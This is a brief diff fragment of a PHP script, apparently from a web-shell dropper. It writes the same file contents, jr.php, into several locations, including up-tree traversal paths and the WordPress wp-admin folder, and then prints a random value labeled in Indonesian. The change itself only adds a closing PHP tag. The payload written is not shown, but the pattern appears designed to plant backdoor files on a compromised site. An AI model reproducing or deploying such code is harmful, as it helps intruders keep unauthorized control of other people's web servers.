@@ -25,3 +25,4 @@ $r=fopen("../../../../../jr.php", "w");fwrite($r,$file);fclose($r);
 $r=fopen("../../wp-admin/jr.php", "w");fwrite($r,$file);fclose($r);
 $r=fopen($filev, "w");fwrite($r,$file);fclose($r);
 echo "Randomnya:".$ndom;
+?>
